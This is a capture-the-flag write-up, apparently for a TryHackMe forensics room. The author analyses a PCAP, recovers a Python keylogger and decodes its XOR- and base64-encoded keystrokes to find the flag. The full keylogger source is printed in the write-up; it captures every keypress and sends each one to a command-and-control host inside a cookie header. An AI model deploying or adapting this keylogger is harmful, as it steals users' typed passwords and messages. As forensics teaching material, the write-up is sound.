#NetworkForensics #PCAPAnalysis #Cryptography

We get a zip archive which contains a `PCAP` file.

I open it in wireshark.

I filter for `http` and can find the "pings" that happen every second from `192.168.1.141` to `34.41.103.191`.

The 34 address is a registered google address!

It all beggins with a python script being downloaded. I follow the stream:

```python
import requests
import base64
from pynput import keyboard

C2_URL = "http://byte-lotus-hotel.thm:8080/"

def getkey():
    p1 = "H0t3lSt@ff0Nly"
    p2 = "K3epS3cr3t!"
    return p1 + p2

def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def sendltr(character):
    raw_bytes = character.encode('utf-8')
    encrypted = xor(raw_bytes, getkey().encode('utf-8'))
    
    b64_string = base64.b64encode(encrypted).decode('utf-8')
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ByteLotusClient/1.1",
        "Cookie": f"hotel_sess_state={b64_string}"
    }    
    try:
        requests.get(C2_URL, headers=headers, timeout=0.5)
    except:
        pass

def on_press(key):
    try:
        sendltr(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            sendltr(" ")
        elif key == keyboard.Key.enter:
            sendltr("\n")

print("[*] Byte Lotus Sync Service started...")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

It looks like the script is a keylogger from the `on_press` and `sendltr` functions. 

I will try to parse this with `tshark`.

```bash
tshark -r traffic.pcapng -Y "http and ip.src==192.168.1.141" -V
```
This shows me the entire http frames with the source `192.168.1.141`. 

By looking at the headers from the python script, I can see that the cookie is where the keylogger sends the keystrokes.

```bash
tshark -r traffic.pcapng -Y "http and ip.src==192.168.1.141" -V | grep "Cookie " | cut -d '=' -f2 > keystrokes.txt
```

It looks like this:
```
HA
AA
BQ
Mw
Hg
ew
Og
fA
Fw
eQ
Ow
Fw
Pw
fA
PA
Kw
IA
eQ
Jg
Lw
Fw
eA
Pg
LQ
Gg
Fw
MQ
eA
PQ
NQ
```

Now I have to use the same XOR function that was used to encrypt these characters with the secret: `H0t3lSt@ff0NlyK3epS3cr3t!`

I write this python script:
```python
import base64

def xor(data: bytes, key: bytes) -> bytes:
	return bytes(b ^ key[i % len(key)] for i,b in enumerate(data))

with open("keystrokes.txt","r") as file:
	msg = ""
	lines = file.readlines()
	stripped = [l.strip() for l in lines if l.strip()]
	for l in stripped:
		b64_decrypted = base64.b64decode(l + "==")
		decrypted = xor(b64_decrypted,key.encode("utf-8")).decode('utf-8')
		msg += decrypted
	print(msg)
```

The keystrokes were the flag!
```
THM{V3r4_1s_w4tch1ng_0veR_y0u}
```

It is important to reverse the order of the encryption when decrypting. First b64 and then xor.

Also, I had some problems with the function `xor` taking in both arguments as bytes. When using `decode('utf-8')` we convert the bytes into characters. So this has to be done after the `xor` function.